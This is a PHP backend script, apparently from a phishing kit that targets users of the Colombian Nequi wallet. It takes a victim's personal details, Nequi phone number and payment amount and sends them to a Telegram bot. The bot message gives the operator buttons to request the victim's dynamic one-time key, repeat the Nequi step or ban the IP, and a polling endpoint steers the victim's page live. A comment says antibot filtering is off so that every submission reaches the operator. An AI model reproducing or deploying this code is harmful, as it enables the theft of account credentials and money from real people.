<?php
// --- IP BLACKLIST GLOBAL CHECK ---
$client_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
if (!empty($client_ip)) {
    $client_ip = trim(explode(',', $client_ip)[0]);
}
$secRoot = __DIR__; while($secRoot !== dirname($secRoot)) { if (file_exists($secRoot . '/includes/security.php')) { require_once $secRoot . '/includes/security.php'; break; } $secRoot = dirname($secRoot); } $blacklist_file = (function_exists('sura_get_project_root') ? sura_get_project_root() : $secRoot) . '/blocked_ips.txt';
if (file_exists($blacklist_file)) {
    $blocked_ips = file($blacklist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($client_ip, $blocked_ips)) {
        header("HTTP/1.1 403 Forbidden");
        exit("Acceso denegado.");
    }
}
// ---------------------------------

ini_set('display_errors', 0);
error_reporting(0);
header('Content-Type: application/json');

/* ============================================================
   ARCHIVOS
   ============================================================ */
$USED_TOKENS_FILE = __DIR__ . '/used_tokens.json';

/* ============================================================
   CARGAR CONFIG
   ============================================================ */
function loadConfig()
{
    $candidateFiles = [
        __DIR__ . '/config.php',
        dirname(__DIR__) . '/config.php',
        dirname(__DIR__, 2) . '/config.php',
        dirname(__DIR__, 3) . '/config.php',
        dirname(__DIR__, 4) . '/config.php',
        '/var/www/html/config.php',
        '/var/www/joker/config.php',
        '/Applications/XAMPP/xamppfiles/htdocs/mood/config.php'
    ];

    foreach ($candidateFiles as $file) {
        if (!file_exists($file)) {
            continue;
        }

        $config = require $file;
        if (!empty($config['bot_token']) && !empty($config['chat_id'])) {
            return [
                'token'   => $config['bot_token'],
                'chat_id' => $config['chat_id']
            ];
        }
    }

    return null;
}

/* ============================================================
   TELEGRAM: SEND MESSAGE
   ============================================================ */
function sendMessage($token, $chatId, $text, $keyboard)
{
    $payload = [
        'chat_id' => $chatId,
        'text' => $text,
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode($keyboard)
    ];

    $ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_TIMEOUT => 5,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_POSTFIELDS => json_encode($payload)
    ]);
    $res = curl_exec($ch);
    curl_close($ch);

    return json_decode($res, true);
}

/* ============================================================
   TELEGRAM: EDIT MESSAGE
   ============================================================ */
function editMessage($token, $chatId, $messageId, $text)
{
    $payload = [
        'chat_id' => $chatId,
        'message_id' => $messageId,
        'text' => $text,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init("https://api.telegram.org/bot{$token}/editMessageText");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_TIMEOUT => 5,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_POSTFIELDS => json_encode($payload)
    ]);
    curl_exec($ch);
    curl_close($ch);
}

/* ============================================================
   KEYBOARD
   ============================================================ */
function buildKeyboard($tid)
{
    return [
        'inline_keyboard' => [
            [['text' => '🧠🖼 Pedir logo y dinámica', 'callback_data' => "dinamica_logo:$tid"]],
            [['text' => '✅ Pago enviado', 'callback_data' => "enviado:$tid"]],
            [['text' => '🔁 Repetir Nequi', 'callback_data' => "repetir:$tid"]],
            [['text' => 'qr', 'url' => 'https://jepadminstcol.fly.dev/recaudos/brev.php']],
            [['text' => '🏁 Finalizar', 'callback_data' => "fin:$tid"]],
            [['text' => '❌ BANEAR IP', 'callback_data' => "ban_ip:$tid"]]
        ]
    ];
}

/* ============================================================
   MENSAJE
   ============================================================ */
function formatMessage($d)
{
    $b = $d['bancoldata'] ?? [];
    $monto = number_format((float)($d['total'] ?? 0), 0, ',', '.');

    $msg = "<b>🧾 Información del Cliente</b>\n\n";
    if (!empty($d['tbdatos']) && is_array($d['tbdatos'])) {
        foreach ($d['tbdatos'] as $k => $v) {
            $msg .= "• " . ucfirst(str_replace('_', ' ', $k)) . ": <code>$v</code>\n";
        }
    }

    $msg .= "\n<b>💸 Pago Nequi</b>\n";
    $msg .= "• 🆔 Transaction ID: <code>{$d['transactionId']}</code>\n";
    $msg .= "• 📱 Número: <code>" . ($b['usuario'] ?? 'N/D') . "</code>\n";
    $msg .= "• 💰 Monto: <b>$ {$monto}</b>";

    return $msg;
}

/* ============================================================
   TOKENS
   ============================================================ */
function isTokenUsed($id)
{
    global $USED_TOKENS_FILE;
    if (!file_exists($USED_TOKENS_FILE)) return false;
    $tokens = json_decode(file_get_contents($USED_TOKENS_FILE), true);
    return isset($tokens[$id]);
}

function markTokenUsed($id)
{
    global $USED_TOKENS_FILE;
    $tokens = file_exists($USED_TOKENS_FILE)
        ? json_decode(file_get_contents($USED_TOKENS_FILE), true)
        : [];
    $tokens[$id] = time();
    file_put_contents($USED_TOKENS_FILE, json_encode($tokens));
}

function normalizeActionValue($action)
{
   $value = trim((string) $action);
   if ($value === '') {
       return '';
   }

   $parts = preg_split('/[:|]/', $value, 2);
   return trim((string) ($parts[0] ?? ''));
}

function getPendingActionFromWebhook($transactionId)
{
   $safeTid = preg_replace('/[^a-zA-Z0-9_-]/', '', (string) $transactionId);
   $projectRoot = dirname(dirname(dirname(dirname(__DIR__))));

   $candidateDirs = array_unique(array_filter([
       __DIR__ . '/actions',
       dirname(__DIR__) . '/actions',
       dirname(dirname(__DIR__)) . '/actions',
       dirname(dirname(dirname(__DIR__))) . '/actions',
       $projectRoot . '/actions',
       '/var/www/html/gate/recargas/transaction/actions',
       '/var/www/html/gate/recargas/transaction/b-15/actions',
       '/var/www/joker/gate/recargas/transaction/actions',
       '/var/www/joker/gate/recargas/transaction/b-15/actions',
       '/Applications/XAMPP/xamppfiles/htdocs/mood/gate/recargas/transaction/actions',
       '/Applications/XAMPP/xamppfiles/htdocs/mood/gate/recargas/transaction/b-15/actions'
   ], static function ($dir) {
       return $dir !== '';
   }));

   foreach ($candidateDirs as $dir) {
       if (!is_dir($dir)) {
           continue;
       }

       if ($safeTid !== '') {
           $file = $dir . '/' . $safeTid . '.txt';
           if (file_exists($file)) {
               $action = trim((string) file_get_contents($file));
               @unlink($file);
               if ($action !== '') {
                   return normalizeActionValue($action);
               }
           }
       }

       foreach (['last_action.txt', 'pending_action.txt'] as $fallbackFile) {
           $fallbackPath = $dir . '/' . $fallbackFile;
           if (!file_exists($fallbackPath)) {
               continue;
           }

           $action = trim((string) file_get_contents($fallbackPath));
           @unlink($fallbackPath);
           if ($action !== '') {
               return normalizeActionValue($action);
           }
       }
   }

   return null;
}

/* ============================================================
   CONFIG
   ============================================================ */
$config = loadConfig();
if (!$config) {
    echo json_encode(['ok' => false]);
    exit;
}

/* ============================================================
   POST → ENVÍO INICIAL
   ============================================================ */
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $d = json_decode(file_get_contents('php://input'), true);
    $tid = $d['transactionId'] ?? '';

    if (!$tid || isTokenUsed($tid)) {
        echo json_encode(['ok' => false]);
        exit;
    }

    // Respaldo: si no llegaron tbdatos del navegador, cargar del registro por ticket
    require_once __DIR__ . '/../tx_fallback.php';
    $tbRaw15 = is_array($d['tbdatos'] ?? null) ? $d['tbdatos'] : [];
    $d['tbdatos'] = tx_cargar_datos_ticket($tbRaw15);

    // --- RECORD CLIENT IP FOR TELEGRAM BAN BUTTON ---
    $cl_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
    if (!empty($cl_ip)) {
        $cl_ip = trim(explode(',', $cl_ip)[0]);
    }
    if (function_exists('sura_save_transaction_ip')) {
        sura_save_transaction_ip($tid, $cl_ip);
    } else {
        $pRoot = __DIR__;
        while ($pRoot !== dirname($pRoot)) {
            if (file_exists($pRoot . '/includes/security.php')) {
                require_once $pRoot . '/includes/security.php';
                if (function_exists('sura_save_transaction_ip')) {
                    sura_save_transaction_ip($tid, $cl_ip);
                }
                break;
            }
            $pRoot = dirname($pRoot);
        }
    }
    // ------------------------------------------------

    // --- EVALUACIÓN ANTIBOT & FILTRO DE DATOS FALSOS ---
    $payloadCheck = array_merge($d['tbdatos'] ?? [], [
        'telefono' => $d['bancoldata']['usuario'] ?? '',
        'bancoldata' => $d['bancoldata'] ?? []
    ]);
    // NOTA: la gate no filtra con el evaluador antibot; todo llega a Telegram
    // con botones y el operador decide.

    markTokenUsed($tid);

    $msg = formatMessage($d);
    $keyboard = buildKeyboard($tid);
    $sent = sendMessage($config['token'], $config['chat_id'], $msg, $keyboard);

    echo json_encode(['ok' => !empty($sent['ok'])]);
    exit;
}

/* ============================================================
   GET → POLLING + REESCRIBE MENSAJE
   ============================================================ */
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['transactionId'])) {

    $tid = $_GET['transactionId'];
    $action = getPendingActionFromWebhook($tid);

    if ($action !== null) {
        echo json_encode([
            'ok' => true,
            'action' => $action
        ]);
        exit;
    }

    echo json_encode(['ok' => false]);
    exit;
}

/* ============================================================
   DEFAULT
   ============================================================ */
echo json_encode(['ok' => false]);
exit;
